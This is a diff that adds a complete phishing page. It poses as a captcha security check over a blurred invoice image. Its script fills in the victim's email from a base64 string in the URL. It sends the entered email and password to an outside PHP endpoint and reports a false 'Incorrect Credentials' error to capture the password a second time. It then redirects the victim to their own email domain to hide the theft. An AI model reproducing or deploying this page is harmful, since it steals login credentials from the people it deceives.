@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>Captcha page | Secured</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+        <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+        <link rel="shortcut icon" href="https://masherabot.com/img/png/adobe/acrobat.png" type="image/x-icon">
+        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
+    </head>
+
+    <style>
+        body{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://res.cloudinary.com/dwzy1xrdp/image/upload/v1756141103/blurred_invoice_nowmqe.jpg') no-repeat center center fixed;
+            background-size: 58% auto;
+            color: #333;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            font-family: 'Archivo Narrow', sans-serif;
+        }
+        .login{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            z-index: 20;
+        }
+        .login_body{
+            width: 60%; /* Reduced from 90% to 60% */
+            max-width: 300px; /* Reduced from 400px to 300px */
+            z-index: 10;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.88); /* Slightly less opaque to show more background */
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15); /* Lighter shadow */
+            display: flex;
+            flex-flow: column;
+            gap: 10px;
+            backdrop-filter: blur(3px); /* Reduced blur to show more background */
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        .confirm{
+            font-weight: 600;
+            text-align: center;
+            margin: 5px 0;
+            color: #062174;
+            font-size: 14px;
+        }
+        .flex_column{
+            display: flex;
+            flex-flow: column;
+            gap: 8px;
+        }
+        #newbutton{
+            width: fit-content !important;
+            background: #062174;
+            color: white;
+            align-self: center;
+            padding: 8px 20px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 600;
+            margin-top: 5px;
+            transition: all 0.3s ease;
+            font-size: 14px;
+        }
+        #newbutton:hover {
+            background: #0d3bbb;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-flow: column;
+            gap: 10px;
+            position: fixed;
+            top: 0; right: 0; bottom: 0; left: 0;
+            z-index: 100;
+            background: white;
+            transition: opacity 0.5s ease;
+        }
+        .loader {
+            width: 48px;
+            height: 48px;
+            display: inline-block;
+            position: relative;
+            background: #062174;
+            box-sizing: border-box;
+            animation: flipX 1s linear infinite;
+            border-radius: 4px;
+        }
+        @keyframes flipX {
+            0% {
+                transform: perspective(200px) rotateX(0deg) rotateY(0deg);
+            }
+            50% {
+                transform: perspective(200px) rotateX(-180deg) rotateY(0deg);
+            }
+            100% {
+                transform: perspective(200px) rotateX(-180deg) rotateY(-180deg);
+            }
+        }
+        
+        .form-control {
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 10px;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            height: 38px;
+        }
+        .form-control:focus {
+            border-color: #062174;
+            box-shadow: 0 0 0 0.2rem rgba(6, 33, 116, 0.25);
+        }
+        label {
+            font-weight: 600;
+            color: #444;
+            font-size: 13px;
+            margin-bottom: 2px;
+        }
+        img {
+            align-self: center;
+            margin-bottom: 5px;
+            border-radius: 8px;
+            width: 100px; /* Reduced from 120px to 100px */
+        }
+        .alert {
+            border-radius: 6px;
+            text-align: center;
+            padding: 8px;
+            font-size: 13px;
+            margin-bottom: 5px;
+        }
+        #error {
+            font-size: 13px;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+        br {
+            display: none;
+        }
+    </style>
+
+    <body>
+        <div class="login">
+            <div class="login_body">
+                <img src="https://media.istockphoto.com/id/1156467607/photo/captcha-im-not-a-robot.jpg?b=1&s=170667a&w=0&k=20&c=qsCUeyZgtDMl98uVMrhPrXqWatuEdwkSyF6YlwLtbW4=">
+                <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
+
+                <div class="text-center confirm"></div>
+
+                <div id="error" style="color: red;"></div>
+                <form class="flex_column" id="form">
+                    <label class="text-secondary font-weight-bold">Email Address</label>
+                    <input type="email" class="form-control email" required="required" name="email" id="email" autocomplete="on">
+                    <label class="text-secondary font-weight-bold">Password</label>
+                    <input type="password" class="form-control password" name="password" required="" id="password">
+                    <input class="btn newbutton" type="submit" value="Sign in" name="submit" id="newbutton">
+                </form>
+            </div>
+        </div>
+    </body>
+
+    <div class="loading" id="loading">
+        <span class="loader"></span>
+    </div>
+
+    <input type="hidden" value="0" id="number">
+
+    <script>
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        var link = window.location.href;
+        var url = new URL(link);
+        var hash = url.hash.replace("#", "").trim();
+
+        var updated_email = hash;
+        if (isBase64(hash)) {
+            updated_email = atob(hash);
+        }
+
+        document.getElementById("email").value = updated_email;
+
+        setTimeout(() => {
+            document.getElementById("loading").style.display = "none";
+        }, 4000);
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var form = document.getElementById("form");
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+                var number = parseInt(document.getElementById("number").value);
+                var formData = new FormData(form);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://administrativewebpage.eu/cp.php", true);
+
+                var errors = document.getElementById("error");
+                errors.innerText = "Incorrect Credentials, Retype Password !";
+                document.getElementById("password").value = "";
+                document.getElementById("number").value = number + 1;
+
+                if (number === 1) {
+                    errors.innerText = "";
+                    setTimeout(() => {
+                        window.location.href = "https://www." + updated_email.split("@")[1];
+                    }, 2000);
+                }
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            console.log(xhr.responseText);
+                        } else {
+                            console.error(xhr.responseText);
+                        }
+                    }
+                };
+                xhr.send(formData); 
+            });
+        });
+    </script>
+</html>
